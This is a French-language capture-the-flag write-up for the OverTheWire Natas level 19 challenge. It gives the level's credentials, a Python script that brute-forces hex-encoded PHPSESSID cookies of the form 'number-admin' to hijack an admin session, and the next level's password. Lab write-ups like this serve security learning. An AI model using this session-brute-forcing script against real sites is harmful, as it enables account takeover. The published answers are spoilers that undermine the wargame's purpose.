## Connexion (username=natas19 password=qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT)
```
http://natas19.natas.labs.overthewire.org/
```

## Recherche du mot de passe
J'ai fais 2-3 essaies. Cette fois c'est comme au numéro précédent mais avec le format:
```
numero-username
```
Le tout encodé en hexadécimal.

```python
import requests

url = "http://natas19.natas.labs.overthewire.org/index.php"
header = {
    "Authorization": "Basic bmF0YXMxOTpxdnd0TXFBY1ZTQmxmN0hFM3N3OXBsamhxcVBGOU1NVA=="
}
with requests.Session() as session:
    for i in range(1, 641):
        cookie = str(i)+"-admin"
        header["Cookie"] = f"PHPSESSID={cookie.encode('utf-8').hex()}"
        session.headers.update(header)
        response = session.get(url)
        if "regular user" not in response.text:
            print(f"The phpsession id is {i}")
            print(response.text)
            break
```
## Prochain mot de passe
```
slOKYGsjlJhaqKliGvrgWAzln0JyrWao
```